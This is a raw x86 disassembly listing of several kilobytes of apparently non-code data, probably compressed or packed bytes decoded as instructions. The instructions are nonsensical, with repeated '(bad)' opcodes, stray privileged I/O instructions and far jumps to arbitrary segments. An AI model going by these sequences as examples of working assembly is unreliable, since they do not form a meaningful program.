  42644b:	pop    ds
  42644c:	cwde   
  42644d:	mov    edi,?
  42644f:	cmp    edi,eax
  426451:	sub    al,0x2d
  426453:	and    al,dl
  426455:	popa   
  426456:	nop
  426457:	bound  ecx,QWORD PTR [ecx]
  426459:	inc    eax
  42645a:	in     eax,dx
  42645b:	sub    eax,0x235a027e
  426460:	sbb    bh,BYTE PTR [ebx-0x67309f93]
  426466:	in     al,0xe1
  426468:	and    al,0x17
  42646a:	mov    dl,0xbf
  42646c:	pushf  
  42646d:	mov    eax,DWORD PTR [bx+si]
  426470:	add    edx,DWORD PTR [esi+0x72e6fb0f]
  426476:	sahf   
  426477:	adc    bh,al
  426479:	in     al,0xfd
  42647b:	fwait
  42647c:	scas   eax,DWORD PTR es:[edi]
  42647d:	test   BYTE PTR [edx-0x13c48029],al
  426483:	jmp    0x426417
  426485:	mov    DWORD PTR [edx],ebp
  426487:	sti    
  426488:	es sti 
  42648a:	or     bl,dh
  42648c:	jle    0x426505
  42648e:	icebp  
  42648f:	retf   0xda60
  426492:	int    0x89
  426494:	mov    ds:0x31dada43,al
  426499:	lods   al,BYTE PTR ds:[esi]
  42649a:	and    DWORD PTR [ebx],edi
  42649c:	inc    ebx
  42649d:	repz std 
  42649f:	stos   BYTE PTR es:[edi],al
  4264a0:	cdq    
  4264a1:	push   cs
  4264a2:	sar    bl,cl
  4264a4:	push   ds
  4264a5:	test   DWORD PTR [ecx],esp
  4264a7:	inc    ecx
  4264a8:	mov    ss,WORD PTR [ecx+esi*2+0xb88490e]
  4264af:	pop    ebp
  4264b0:	sub    BYTE PTR [esi+0x73],ch
  4264b3:	adc    dh,BYTE PTR [ebp-0x7b]
  4264b6:	pop    eax
  4264b7:	(bad)  
  4264b8:	es add eax,0xd095d148
  4264be:	xchg   esp,eax
  4264bf:	ret    
  4264c0:	inc    ecx
  4264c1:	sub    bh,BYTE PTR [eax+0x14]
  4264c4:	into   
  4264c5:	sbb    eax,0xb08e2589
  4264ca:	mov    ecx,0x8e42a4b6
  4264cf:	sbb    dh,BYTE PTR [ebp-0x2a]
  4264d2:	cdq    
  4264d3:	or     cl,BYTE PTR [eax]
  4264d5:	out    dx,eax
  4264d6:	and    DWORD PTR [edx+ebp*4+0x39],ecx
  4264da:	mov    ch,0x7e
  4264dc:	scas   al,BYTE PTR es:[edi]
  4264dd:	inc    ecx
  4264de:	jmp    0x42646d
  4264e0:	add    al,0x19
  4264e2:	jbe    0x4264f1
  4264e4:	cmp    al,BYTE PTR [esp+esi*1-0x20314229]
  4264eb:	pop    ecx
  4264ec:	sbb    ecx,DWORD PTR [ebp-0x66f32ce6]
  4264f2:	loopne 0x426552
  4264f4:	mov    bh,0x8f
  4264f6:	and    al,0x1
  4264f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264f9:	or     ebx,DWORD PTR ds:0xae4ce19c
  4264ff:	dec    esp
  426500:	push   0xffffffe6
  426502:	mov    dh,0x65
  426504:	repnz cmp eax,0x6104150c
  42650a:	or     al,0xa8
  42650c:	and    dh,dl
  42650e:	ror    BYTE PTR [esi+ecx*1],1
  426511:	jle    0x4264c4
  426513:	mov    cl,0xc1
  426515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426516:	add    eax,esp
  426518:	jl     0x42653c
  42651a:	mov    esi,0xa9b6ccbf
  42651f:	xor    eax,0xacc370e0
  426524:	stos   DWORD PTR es:[edi],eax
  426525:	add    BYTE PTR [esp+ecx*8-0x7a],al
  426529:	and    eax,0x6e860b63
  42652e:	mov    dl,0x2b
  426530:	adc    cl,ah
  426532:	dec    eax
  426533:	scas   eax,DWORD PTR es:[edi]
  426534:	iret   
  426535:	dec    ebp
  426536:	jo     0x42650f
  426538:	aad    0x19
  42653a:	push   ebx
  42653b:	sbb    DWORD PTR ds:0xe65d0199,0x35
  426542:	adc    eax,0x4a23b9e5
  426547:	pop    esi
  426548:	aam    0xe3
  42654a:	test   al,0x1
  42654c:	and    BYTE PTR [ebp-0x6],bh
  42654f:	cmp    al,0x33
  426551:	shl    DWORD PTR [ebx-0x1f],0xa8
  426555:	call   0xee98:0x65285324
  42655c:	cwde   
  42655d:	mov    esp,0x4283e94b
  426562:	pop    esi
  426563:	loopne 0x4265d8
  426565:	dec    ebx
  426566:	sub    ah,0xd
  426569:	mov    ah,BYTE PTR [esi+0x2eeb5fe3]
  42656f:	xor    al,0x52
  426571:	dec    eax
  426572:	adc    eax,0x925f46a2
  426577:	or     ebx,ebx
  426579:	and    al,0x4f
  42657b:	add    BYTE PTR ds:0xaf4711c2,bh
  426581:	and    bl,ch
  426583:	adc    eax,DWORD PTR [edi-0x68]
  426586:	arpl   WORD PTR [ebp+0x25],sp
  426589:	les    ebx,FWORD PTR [ecx-0x1d]
  42658c:	ror    DWORD PTR ds:[edi+0x0],0x0
  426594:	add    BYTE PTR [eax],al
  426596:	add    BYTE PTR [eax],al
  426598:	add    BYTE PTR [eax],al
  42659a:	(bad)  
  42659b:	rol    BYTE PTR [edi],0x37
  42659e:	dec    edi
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x42652b
  4265a7:	sub    al,bl
  4265a9:	adc    al,0x81
  4265ab:	fadd   QWORD PTR [ecx]
  4265ad:	add    ch,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [eax+0x7a],ah
  4265b4:	xlat   BYTE PTR ds:[ebx]
  4265b5:	adc    edx,0x34
  4265b8:	sub    DWORD PTR [ecx-0x6c6334e5],0x2c
  4265bf:	es inc esp
  4265c1:	test   al,0x33
  4265c3:	inc    esp
  4265c4:	pop    eax
  4265c5:	lods   eax,DWORD PTR ds:[esi]
  4265c6:	leave  
  4265c7:	in     eax,0x7b
  4265c9:	dec    edi
  4265ca:	push   0x2d
  4265cc:	aam    0xd8
  4265ce:	(bad)  
  4265cf:	xchg   edx,eax
  4265d0:	arpl   WORD PTR [ecx],cx
  4265d2:	(bad)  
  4265d3:	jb     0x4265b8
  4265d5:	hlt    
  4265d6:	or     al,0x5
  4265d8:	fs into 
  4265da:	sahf   
  4265db:	pop    ds
  4265dc:	push   cs
  4265dd:	test   BYTE PTR [ecx+0x4],0x70
  4265e1:	inc    ebp
  4265e2:	js     0x426646
  4265e4:	clc    
  4265e5:	sub    BYTE PTR [edi-0x3d],al
  4265e8:	mov    bh,0xc
  4265ea:	mov    bl,0x7a
  4265ec:	fild   DWORD PTR [ebx+ebp*2+0x7f]
  4265f0:	push   edi
  4265f1:	and    BYTE PTR [esi+0xf66dbe7],0x39
  4265f8:	loope  0x426652
  4265fa:	adc    BYTE PTR [ebx-0x2d412b38],bh
  426600:	xlat   BYTE PTR ds:[ebx]
  426601:	nop
  426602:	hlt    
  426603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426604:	jmp    0x426646
  426606:	ins    BYTE PTR es:[edi],dx
  426607:	inc    ebx
  426608:	dec    edi
  426609:	mov    eax,0x5bbc08d4
  42660e:	test   BYTE PTR [ebp+0x39],bl
  426611:	and    al,0x25
  426613:	pop    esp
  426614:	pop    ecx
  426615:	dec    eax
  426616:	mov    edi,?
  426618:	fst    DWORD PTR [ecx+0x4e]
  42661b:	daa    
  42661c:	mov    ecx,0x5b33f43d
  426621:	imul   ecx,ecx,0x2f
  426624:	and    eax,0x37801c76
  426629:	xchg   esp,eax
  42662a:	or     bh,bl
  42662c:	loopne 0x42668a
  42662e:	into   
  42662f:	call   0x78ea498f
  426634:	add    BYTE PTR [ebx],bh
  426636:	push   ebx
  426637:	into   
  426638:	jne    0x42663a
  42663a:	and    ecx,DWORD PTR [ecx-0x7583fe3e]
  426640:	fs lock popa 
  426643:	pusha  
  426644:	loope  0x42661c
  426646:	jg     0x4265f5
  426648:	sub    al,0xf6
  42664a:	or     eax,DWORD PTR [ecx]
  42664c:	ins    DWORD PTR es:[edi],dx
  42664d:	lods   al,BYTE PTR ds:[esi]
  42664e:	std    
  42664f:	jl     0x4265f2
  426651:	fimul  DWORD PTR [edi-0x5d]
  426654:	pop    DWORD PTR [edi*2+0x2af2471c]
  42665b:	fbld   TBYTE PTR [edx]
  42665d:	inc    esi
  42665e:	ss scas al,BYTE PTR es:[edi]
  426660:	dec    esi
  426661:	and    eax,0x989a1bf
  426666:	pop    es
  426667:	repz mov esp,0x1c7a9a37
  42666d:	jmp    0x1bd91b0
  426672:	sub    ch,0xf8
  426675:	push   ss
  426676:	hlt    
  426677:	cdq    
  426678:	nop
  426679:	sub    DWORD PTR [edx],eax
  42667b:	xchg   DWORD PTR [eax],ebp
  42667d:	aad    0xe7
  42667f:	mov    dl,0x19
  426681:	ja     0x4266eb
  426683:	dec    ebx
  426684:	cmc    
  426685:	inc    DWORD PTR [ebx+0x33]
  426688:	mov    eax,0x2afb2701
  42668d:	out    0x9f,al
  42668f:	cld    
  426690:	push   edx
  426691:	jmp    0xc1a9d63a
  426696:	xlat   BYTE PTR ds:[ebx]
  426697:	retf   
  426698:	daa    
  426699:	ror    BYTE PTR [ebx+0x21],1
  42669c:	pop    edi
  42669d:	into   
  42669e:	jb     0x42667a
  4266a0:	jbe    0x426643
  4266a2:	addr16 pop edx
  4266a4:	icebp  
  4266a5:	mov    ah,0x14
  4266a7:	je     0x4266a1
  4266a9:	and    ebx,edx
  4266ab:	popa   
  4266ac:	aaa    
  4266ad:	and    bl,BYTE PTR [esi+ecx*4]
  4266b0:	jno    0x426719
  4266b2:	cmp    DWORD PTR [eax],edi
  4266b4:	jmp    0x42672d
  4266b6:	loopne 0x4266cc
  4266b8:	add    ebp,DWORD PTR ds:0x4f91abe3
  4266be:	shl    bh,1
  4266c0:	dec    esp
  4266c1:	xlat   BYTE PTR ds:[ebx]
  4266c2:	jmp    0xf0903051
  4266c7:	out    dx,eax
  4266c8:	xor    BYTE PTR [ebx+0x62],bl
  4266cb:	in     al,dx
  4266cc:	jo     0x42667d
  4266ce:	pop    ss
  4266cf:	xchg   edi,eax
  4266d0:	call   0xf80a:0x9e397c35
  4266d7:	(bad)  [ecx]
  4266d9:	mov    eax,0xd902b7c
  4266de:	mov    ah,0xfb
  4266e0:	sti    
  4266e1:	js     0x426667
  4266e3:	test   BYTE PTR [edi+0x4a251958],bh
  4266e9:	arpl   WORD PTR [eax+0x3],bp
  4266ec:	cmp    dh,BYTE PTR [edi]
  4266ee:	ins    DWORD PTR es:[edi],dx
  4266ef:	sub    DWORD PTR [ebx+0x3bc8a5c4],ecx
  4266f5:	pop    es
  4266f6:	lods   eax,DWORD PTR ds:[esi]
  4266f7:	sbb    ah,BYTE PTR [ecx]
  4266f9:	jnp    0x4266d2
  4266fb:	mov    ch,0x44
  4266fd:	add    eax,0xe3ab8b5c
  426702:	xor    ah,BYTE PTR [edx]
  426704:	std    
  426705:	inc    eax
  426706:	in     al,dx
  426707:	(bad)
  42670a:	cmp    DWORD PTR [ebp-0x3303272c],ecx
  426710:	pop    edi
  426711:	xchg   edx,eax
  426712:	mov    dh,0x59
  426714:	aaa    
  426715:	stc    
  426716:	pop    ss
  426717:	inc    ebp
  426718:	les    edi,FWORD PTR [edx-0x34]
  42671b:	scas   eax,DWORD PTR es:[edi]
  42671c:	frstor [edx]
  42671e:	mov    ds,WORD PTR [ebp+0x6a]
  426721:	xor    BYTE PTR [edx+0x5e],al
  426724:	mov    edi,0xa396b8f6
  426729:	sub    DWORD PTR [ecx],edi
  42672b:	cwde   
  42672c:	rcr    DWORD PTR [ebx+0x1e2f77e5],0xc9
  426733:	cmp    DWORD PTR [ebp+0x6e],edi
  426736:	out    0x51,al
  426738:	lods   al,BYTE PTR ds:[esi]
  426739:	nop
  42673a:	mov    DWORD PTR [ebx],edx
  42673c:	test   eax,0xe8b86859
  426741:	cwde   
  426742:	mov    eax,0xa2741435
  426747:	sub    ebx,ecx
  426749:	gs sbb dl,dl
  42674c:	fstp   DWORD PTR [ebx+0x67e7a925]
  426752:	xor    dh,BYTE PTR [bp+si]
  426755:	add    ebp,eax
  426757:	xchg   ebx,eax
  426758:	mov    bh,0x27
  42675a:	inc    esi
  42675b:	jecxz  0x4267bf
  42675d:	jbe    0x42670c
  42675f:	mov    bh,0x8a
  426761:	aaa    
  426762:	out    dx,al
  426763:	fdivr  st,st(1)
  426765:	in     eax,0x55
  426767:	mov    ds:0xf061fb8b,al
  42676c:	ffree  st(3)
  42676e:	push   edi
  42676f:	or     al,0x76
  426771:	je     0x42672a
  426773:	add    dl,bh
  426775:	pop    ebp
  426776:	pop    ss
  426777:	mov    cl,BYTE PTR [ebx]
  426779:	and    eax,0x72ad903f
  42677e:	inc    ebx
  42677f:	sbb    BYTE PTR [ebp+0x44b6cb89],bh
  426785:	xchg   edx,eax
  426786:	jb     0x42677c
  426788:	ins    DWORD PTR es:[edi],dx
  426789:	in     eax,dx
  42678a:	jmp    0xcff2:0x91dfd81b
  426791:	sub    al,0xb9
  426793:	inc    ebp
  426794:	aam    0xf6
  426796:	mov    ecx,DWORD PTR [edx+0x5e]
  426799:	lea    eax,[edx]
  42679b:	popf   
  42679c:	xchg   esp,eax
  42679d:	jno    0x426817
  42679f:	lods   eax,DWORD PTR ds:[esi]
  4267a0:	inc    ecx
  4267a1:	adc    BYTE PTR [ebx],bh
  4267a3:	jge    0x4267a9
  4267a5:	data16 (bad) 
  4267a7:	outs   dx,DWORD PTR ds:[esi]
  4267a8:	sub    DWORD PTR [ebx],esp
  4267aa:	xchg   edx,eax
  4267ab:	xor    esp,DWORD PTR [edi+0x2a]
  4267ae:	cmp    al,0x0
	...
  4267b8:	add    BYTE PTR [eax],al
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	aaa    
  4267c7:	push   0xde7e8361
  4267cc:	add    DWORD PTR [eax],eax
  4267ce:	std    
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [ecx+0x7c],ch
  4267d4:	push   0x40b3d8ea
  4267d9:	cwde   
  4267da:	(bad)  
  4267db:	aaa    
  4267dc:	in     al,dx
  4267dd:	dec    eax
  4267de:	out    0xf,eax
  4267e0:	cld    
  4267e1:	pop    es
  4267e2:	fs xchg esp,eax
  4267e4:	fiadd  WORD PTR ds:0xdb285b40
  4267ea:	dec    edx
  4267eb:	pop    esp
  4267ec:	fidiv  WORD PTR [esi-0x23d61867]
  4267f2:	dec    ebx
  4267f3:	add    eax,0x147e82b0
  4267f8:	fstp   QWORD PTR [esi-0x71f12d31]
  4267fe:	mov    bl,0xde
  426800:	rcl    BYTE PTR [ebx-0x18a459e3],cl
  426806:	inc    esp
  426807:	sub    bh,al
  426809:	sbb    al,0xd0
  42680b:	jae    0x4267cd
  42680d:	push   0x69
  42680f:	inc    ecx
  426810:	(bad)  
  426811:	push   ds
  426812:	mov    ah,0x29
  426814:	(bad)  
  426815:	enter  0x6935,0x76
  426819:	lds    edi,FWORD PTR [edx+ebx*8]
  42681c:	cld    
  42681d:	repz jecxz 0x4267c4
  426820:	dec    esi
  426821:	mov    ebp,esp
  426823:	cmp    ecx,DWORD PTR [ebx+0x16]
  426826:	loope  0x426862
  426828:	cmp    esp,esi
  42682a:	jg     0x4267c4
  42682c:	fnsavew [ecx-0x65c7208b]
  426833:	push   eax
  426834:	pop    eax
  426835:	ss je  0x4268ac
  426838:	push   ecx
  426839:	mov    dl,dh
  42683b:	inc    esi
  42683c:	pop    edi
  42683d:	mov    esi,0x5d77b849
  426842:	(bad)  
  426843:	dec    eax
  426844:	xchg   dh,bh
  426846:	test   DWORD PTR [ebx],0x9bdedaf7
  42684c:	and    eax,0x3e2205bb
  426851:	mov    esp,0x831a54e3
  426856:	fcomp  QWORD PTR ds:[edx]
  426859:	sbb    DWORD PTR [ecx],esp
  42685b:	nop
  42685c:	mov    bh,0x45
  42685e:	xchg   edx,eax
  42685f:	adc    edi,DWORD PTR [ebx]
  426861:	loope  0x426824
  426863:	rcl    DWORD PTR [esi+edi*1],1
  426866:	pop    eax
  426867:	sar    BYTE PTR [eax+0x200030c9],0x8c
  42686e:	cld    
  42686f:	or     esp,eax
  426871:	pop    ecx
  426872:	push   ss
  426873:	rcl    BYTE PTR [ecx-0x70],0x47
  426877:	cld    
  426878:	add    eax,0xcfc34a8b
  42687d:	pop    edx
  42687e:	imul   esp,DWORD PTR [eax+0x29],0x24
  426882:	inc    edx
  426883:	push   eax
  426884:	adc    dl,0xcd
  426887:	push   es
  426888:	test   BYTE PTR [edi+0x6ba42b6b],dh
  42688e:	jmp    0x42681f
  426890:	jmp    0x2ea0:0xb41d1467
  426897:	pushf  
  426898:	lock jmp 0x3dce:0x67394177
  4268a0:	push   cs
  4268a1:	push   esp
  4268a2:	clc    
  4268a3:	ins    DWORD PTR es:[edi],dx
  4268a4:	inc    eax
  4268a5:	jp     0x4268ab
  4268a7:	lds    ecx,FWORD PTR [edi+ecx*4]
  4268aa:	loopne 0x4268b3
  4268ac:	mov    esi,0x4e7c68d4
  4268b1:	inc    ebx
  4268b2:	mov    ecx,0x3ad98109
  4268b7:	icebp  
  4268b8:	bound  edx,QWORD PTR [edi-0x39]
  4268bb:	xchg   edx,eax
  4268bc:	arpl   WORD PTR [esp+eiz*2+0x65],bp
  4268c0:	mov    esp,0xe888dc7
  4268c5:	xchg   ecx,eax
  4268c6:	aas    
  4268c7:	cs pop ds
  4268c9:	dec    edx
  4268ca:	(bad)  
  4268cb:	cmp    al,BYTE PTR [edi-0xcecbabf]
  4268d1:	jmp    0x426916
  4268d3:	test   DWORD PTR [edi+ebp*2-0x47],edi
  4268d7:	pushf  
  4268d8:	imul   edx,DWORD PTR [ebx+0x4d7b00fa],0x13
  4268df:	mov    esi,0x4dd4fb3c
  4268e4:	(bad)  
  4268e5:	sahf   
  4268e6:	stc    
  4268e7:	pop    esi
  4268e8:	push   edx
  4268e9:	pop    esi
  4268ea:	and    DWORD PTR [ecx-0x78242bbc],ebp
  4268f0:	cmp    edx,DWORD PTR [eax]
  4268f2:	popf   
  4268f3:	add    bl,bl
  4268f5:	cli    
  4268f6:	lahf   
  4268f7:	xchg   BYTE PTR [esi+0x64],ch
  4268fa:	ds addr16 enter 0x11,0xc7
  426900:	(bad)  
  426901:	push   ebp
  426902:	into   
  426903:	add    edi,esp
  426905:	imul   ebx,DWORD PTR [edi+edx*8],0xe2578ce6
  42690c:	mov    ah,0x19
  42690e:	xchg   esp,eax
  42690f:	fidiv  DWORD PTR [ebx]
  426911:	xchg   esp,eax
  426912:	and    eax,edi
  426914:	push   esp
  426915:	adc    DWORD PTR [edi+0xd2f5d08],edx
  42691b:	imul   esp,DWORD PTR [ebx+0xd],0x3f
  42691f:	fisttp QWORD PTR ds:0xd719d6a3
  426925:	mov    ah,0x53
  426927:	repz push edx
  426929:	std    
  42692a:	cmp    eax,0x92f80a6c
  42692f:	lock push ebp
  426931:	ret    0xc82a
  426934:	imul   ebx,DWORD PTR [esi+0x5a],0x769a0623
  42693b:	mov    dl,0x5a
  42693d:	aaa    
  42693e:	push   esp
  42693f:	cmp    edi,edx
  426941:	inc    esi
  426942:	cmp    ebp,ebp
  426944:	rol    ch,cl
  426946:	cld    
  426947:	retf   0x7130
  42694a:	popa   
  42694b:	int3   
  42694c:	jle    0x426963
  42694e:	sub    DWORD PTR [ebx+0x17fd4d28],edi
  426954:	nop
  426955:	hlt    
  426956:	add    eax,0x1e9537fe
  42695b:	and    BYTE PTR [edx],bl
  42695d:	mov    ds:0x7efdfc97,al
  426962:	or     BYTE PTR [edx-0x41],dl
  426965:	fs jno 0x426925
  426968:	icebp  
  426969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42696a:	pushf  
  42696b:	nop
  42696c:	push   eax
  42696d:	data16 sub BYTE PTR [edx-0x2752034f],0xb0
  426975:	mov    ah,BYTE PTR [ebx+0x5778e624]
  42697b:	dec    edx
  42697c:	push   0xe4b039b8
  426981:	dec    ebp
  426982:	or     DWORD PTR [ecx],edi
  426984:	sahf   
  426985:	das    
  426986:	adc    eax,0x14957970
  42698b:	mov    ds:0xf86e91b2,al
  426990:	iret   
  426991:	loop   0x426a04
  426993:	mov    es,WORD PTR [edx-0x5b]
  426996:	ret    0x1fae
  426999:	jns    0x4269e7
  42699b:	jno    0x4269d4
  42699d:	loop   0x42692e
  42699f:	ror    bh,0xaa
  4269a2:	push   esi
  4269a3:	fsubrp st(0),st
  4269a5:	adc    ebx,DWORD PTR [edx]
  4269a7:	bound  edx,QWORD PTR [ecx-0x78ba607d]
  4269ad:	clc    
  4269ae:	loope  0x426a17
  4269b0:	jbe    0x426936
  4269b2:	call   0x100c:0xe154f992
  4269b9:	xchg   BYTE PTR [ebp+0x1d51f9e6],dl
  4269bf:	mov    esp,0xe601a99e
  4269c4:	jae    0x42694b
  4269c6:	xor    DWORD PTR [ebx],edx
  4269c8:	cwde   
  4269c9:	iret   
  4269ca:	stos   BYTE PTR es:[edi],al
  4269cb:	jmp    0x0:0x6bb15c
	...
  4269da:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  4269e1:	fcomp  QWORD PTR [edi+0x23]
  4269e4:	or     al,0x8a
  4269e6:	pop    ebp
  4269e7:	jmp    0x426985
  4269e9:	ret    0xe07b
  4269ec:	add    DWORD PTR [eax],eax
  4269ee:	std    
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [ebp+0x68fd840],bh
  4269f7:	or     DWORD PTR [eax-0x53],ecx
  4269fa:	pusha  
  4269fb:	cs or  eax,0x268e8dac
  426a01:	dec    edi
  426a02:	bound  ecx,QWORD PTR [esi+edi*8]
  426a05:	scas   al,BYTE PTR es:[edi]
  426a06:	ror    BYTE PTR [eax+0x2b],1
  426a09:	sbb    eax,0x176a0002
  426a0e:	jmp    0x4269b0
  426a10:	add    bl,BYTE PTR [edi]
  426a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a13:	xchg   esi,eax
  426a14:	je     0x426a2c
  426a16:	sbb    eax,0xb21afaf3
  426a1b:	mov    bh,0x9b
  426a1d:	aad    0x8e
  426a1f:	push   ebx
  426a20:	ja     0x426a8b
  426a22:	jecxz  0x4269eb
  426a24:	mov    cl,0x67
  426a26:	mov    cl,BYTE PTR [edx-0x319800ad]
  426a2c:	mov    dh,0xc3
  426a2e:	lods   al,BYTE PTR ds:[esi]
  426a2f:	jmp    0xfee:0x445764fa
  426a36:	(bad)  
  426a38:	inc    ebx
  426a39:	mov    dl,0xe6
  426a3b:	add    eax,0x31d4d8e9
  426a40:	call   0xf842de2b
  426a45:	dec    ecx
  426a46:	daa    
  426a47:	ror    edx,1
  426a49:	jl     0x426a79
  426a4b:	inc    eax
  426a4c:	fwait
  426a4d:	lea    esp,[ebx+0x78]
  426a50:	jge    0x4269ea
  426a52:	mov    ecx,0x2c7a75e6
  426a57:	pop    ecx
  426a58:	pop    ds
  426a59:	and    al,0xd5
  426a5b:	xchg   ebp,ebp
  426a5d:	and    DWORD PTR [esi-0x54],edx
  426a60:	cli    
  426a61:	sbb    al,0x9c
  426a63:	xchg   BYTE PTR [eax+0x24],bh
  426a66:	or     ebp,ebp
  426a68:	mov    WORD PTR ds:0x3c31efb6,?
  426a6e:	mov    dh,0x70
  426a70:	push   ss
  426a71:	data16 mov dl,BYTE PTR [edx-0x86afdaa]
  426a78:	mov    al,ds:0x797f3535
  426a7d:	pop    esi
  426a7e:	scas   al,BYTE PTR es:[edi]
  426a7f:	mov    ebp,0x8adc84e3
  426a84:	es scas eax,DWORD PTR es:[edi]
  426a86:	sahf   
  426a87:	xchg   esi,eax
  426a88:	neg    DWORD PTR [eax]
  426a8a:	or     eax,0x4e16b0d6
  426a8f:	xor    BYTE PTR [eax],dh
  426a91:	pop    ebx
  426a92:	lahf   
  426a93:	push   0x624d264c
  426a98:	imul   WORD PTR [ebp-0x30]
  426a9c:	cmp    BYTE PTR [ebx+edi*4],ah
  426a9f:	gs stc 
  426aa1:	psubusw mm4,QWORD PTR [ebx+0x37]
  426aa5:	inc    eax
  426aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426aa7:	paddsw mm2,QWORD PTR [ebx]
  426aaa:	enter  0x1d8e,0x65
  426aae:	retf   0x3a71
  426ab1:	jge    0x426ab5
  426ab3:	pop    ebx
  426ab4:	(bad)  
  426ab5:	xchg   esi,eax
  426ab6:	les    edi,FWORD PTR [ecx-0x5275e185]
  426abc:	inc    ecx
  426abd:	adc    edi,DWORD PTR [eax+0x20]
  426ac0:	sbb    al,0xb3
  426ac2:	bound  edi,QWORD PTR [esi]
  426ac4:	out    0x9e,al
  426ac6:	out    dx,eax
  426ac7:	data16 and bh,ch
  426aca:	(bad)  
  426acb:	jo     0x426b23
  426acd:	cwde   
  426ace:	xor    ch,BYTE PTR [ebx]
  426ad0:	rol    BYTE PTR cs:[ecx+edx*8-0x19],cl
  426ad5:	aas    
  426ad6:	jmp    0x4e2b2a66
  426adb:	xor    dl,al
  426add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ade:	ret    0x186b
  426ae1:	xchg   ebp,eax
  426ae2:	loopne 0x426a81
  426ae4:	nop
  426ae5:	mov    eax,ds:0x2ea2257a
  426aea:	popa   
  426aeb:	retf   
  426aec:	call   0xa139:0x4380
  426af2:	xor    al,0x83
  426af4:	mov    bh,0xa1
  426af6:	shr    BYTE PTR [edx+0x20cb93ec],0x69
  426afd:	mov    eax,ds:0x1e267c1b
  426b02:	push   esi
  426b03:	jmp    0x2d57d25
  426b08:	mov    ah,0xc2
  426b0a:	enter  0xa8e3,0x3d
  426b0e:	pusha  
  426b0f:	idiv   DWORD PTR [edx]
  426b11:	push   esp
  426b12:	push   ecx
  426b13:	loope  0x426b63
  426b15:	xor    BYTE PTR [ebx-0x1e863328],dh
  426b1b:	je     0x426b0e
  426b1d:	call   0xca9f7213
  426b22:	retf   0x8a85
  426b25:	fwait
  426b26:	rol    DWORD PTR [ebx-0x1833c50a],0x60
  426b2d:	stos   DWORD PTR es:[edi],eax
  426b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b2f:	sub    bl,BYTE PTR [ecx-0x4463fcb2]
  426b35:	jo     0x426b2a
  426b37:	adc    al,0x2e
  426b39:	mov    al,0x50
  426b3b:	mov    al,0xdc
  426b3d:	rcr    DWORD PTR [edx+0x3267c0be],1
  426b43:	adc    DWORD PTR [ebx+0x83c5fa4],edi
  426b49:	pop    edx
  426b4a:	dec    edx
  426b4b:	iret   
  426b4c:	sub    DWORD PTR [esi-0x5c],ecx
  426b4f:	pushf  
  426b50:	pop    ebx
  426b51:	sub    ebx,DWORD PTR [esi+0x5c252d30]
  426b57:	(bad)  
  426b58:	in     al,dx
  426b59:	cld    
  426b5a:	sub    dl,bh
  426b5c:	mov    ecx,cs
  426b5e:	pop    ecx
  426b5f:	push   ebx
  426b60:	popf   
  426b61:	ins    DWORD PTR es:[edi],dx
  426b62:	enter  0xe756,0x15
  426b66:	or     al,0x14
  426b68:	mov    ds:0x1f5f960c,eax
  426b6d:	lods   eax,DWORD PTR ds:[esi]
  426b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b6f:	xchg   edx,eax
  426b70:	outs   dx,DWORD PTR cs:[esi]
  426b72:	lods   eax,DWORD PTR ds:[esi]
  426b73:	jg     0x426bac
  426b75:	lods   al,BYTE PTR ds:[esi]
  426b76:	push   esp
  426b77:	push   0x59
  426b79:	fcom   QWORD PTR ds:0x248c8412
  426b7f:	retf   0x88a3
  426b82:	jecxz  0x426b9e
  426b84:	mov    ch,0xed
  426b86:	pop    ecx
  426b87:	aas    
  426b88:	test   DWORD PTR [edx-0x2965af65],edi
  426b8e:	pop    ecx
  426b8f:	idiv   BYTE PTR [edi-0x15]
  426b92:	test   BYTE PTR ds:0x93461448,ah
  426b98:	push   eax
  426b99:	or     DWORD PTR ds:0x6c3363f7,edx
  426b9f:	sbb    DWORD PTR [ebx],eax
  426ba1:	mov    cl,0x57
  426ba3:	lahf   
  426ba4:	mov    al,0xc7
  426ba6:	fdivrp st(4),st
  426ba8:	cmp    al,0x8b
  426baa:	pop    edx
  426bab:	ret    
  426bac:	ja     0x426b82
  426bae:	call   0xe87b0950
  426bb3:	fistp  QWORD PTR [eax]
  426bb5:	cs dec ecx
  426bb7:	into   
  426bb8:	leave  
  426bb9:	cmc    
  426bba:	inc    ecx
  426bbb:	outs   dx,BYTE PTR ds:[esi]
  426bbc:	xchg   esp,eax
  426bbd:	mov    eax,0x467f63b3
  426bc2:	aas    
  426bc3:	icebp  
  426bc4:	adc    BYTE PTR [eax-0x7a],bh
  426bc7:	or     eax,0x3dbed1fc
  426bcc:	jb     0x426bfc
  426bce:	(bad)  
  426bcf:	mov    dh,0xb1
  426bd1:	popf   
  426bd2:	fs adc al,0x83
  426bd5:	jae    0xbc05cfed
  426bdb:	sub    DWORD PTR [esi],0x7a67e6ee
  426be1:	inc    ebp
  426be2:	pop    ebx
  426be3:	or     eax,0x9b2e7b3e
  426be8:	jo     0x426bdb
  426bea:	cld    
  426beb:	sub    bh,BYTE PTR [eax]
  426bed:	shl    DWORD PTR [ecx],cl
	...
  426bf7:	add    BYTE PTR [eax],al
  426bf9:	add    BYTE PTR [eax-0x56],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xfcfe433f,al
  426c07:	cmp    al,0xf1
  426c09:	cmp    BYTE PTR [eax-0x1e],0x1
  426c0d:	add    ch,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    al,bl
  426c13:	inc    esi
  426c14:	dec    ebp
  426c15:	cmp    al,BYTE PTR [edi-0x6191e78]
